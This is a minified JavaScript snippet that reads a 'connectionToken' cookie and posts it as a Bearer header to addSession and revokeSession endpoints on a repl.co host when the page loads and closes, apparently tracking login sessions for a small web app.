function accessCookie(e){for(var o=e+"=",n=document.cookie.split(";"),i=0;i<n.length;i++){var t=n[i].trim();if(0==t.indexOf(o))return t.substring(o.length,t.length)}return""}window.onload=function(){fetch("https://login-finished.wumpus-dev.repl.co/addSession",{method:"POST",headers:{authorization:"Bearer "+accessCookie("connectionToken")}})},window.onunload=function(){fetch("https://login-finished.wumpus-dev.repl.co/revokeSession",{method:"POST",headers:{authorization:"Bearer "+accessCookie("connectionToken")}})},window.onclose=function(){fetch("https://login-finished.wumpus-dev.repl.co/revokeSession",{method:"POST",headers:{authorization:"Bearer "+accessCookie("connectionToken")}})};